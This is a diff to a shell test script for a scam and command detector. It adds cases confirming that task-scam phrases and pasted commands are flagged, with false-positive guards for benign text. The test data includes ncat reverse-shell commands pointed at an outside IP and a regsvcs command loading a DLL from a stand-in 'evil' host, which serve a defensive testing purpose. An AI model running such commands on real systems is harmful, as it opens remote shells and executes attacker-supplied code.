@@ -11671,6 +11671,20 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-211: task-scam vocab + regsvcs/ncat --exec ──────────────
+check_text_hit 'like videos to earn money from home' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: like-videos-earn flagged"
+check_text_hit 'finish your daily task quota to unlock pay' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: daily-task-quota flagged"
+check_text_hit 'merchant task order grab commission' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: merchant-task flagged"
+check_text_hit 'the task quota for q3 is set' 'OK' "text FP guard: q3 task quota clean"
+for p in 'ncat --exec cmd 1.2.3.4 443' 'ncat --sh-exec sh 1.2.3.4 443' 'regsvcs x.dll' 'regsvcs http://evil/x.dll'; do
+    ./hlse_core paste -- "$p" 2>&1 | head -1 | grep -q "ALERT\|BLOCK" \
+        && check "paste: $p flagged" "0" "0" \
+        || check "paste: $p flagged" "0" "1"
+done
+./hlse_core paste -- 'regsvcs tools' 2>&1 | head -1 | grep -q "OK" \
+    && check "paste FP guard: bare regsvcs clean" "0" "0" \
+    || check "paste FP guard: bare regsvcs clean" "0" "1"
+
 # ── cycle-210: MFA 'tap approve' + IVR callback vocab ─────────────
 check_text_hit 'tap approve on the prompt to continue' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: tap-approve flagged"
 check_text_hit 'approve this request to keep access' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: approve-request flagged"
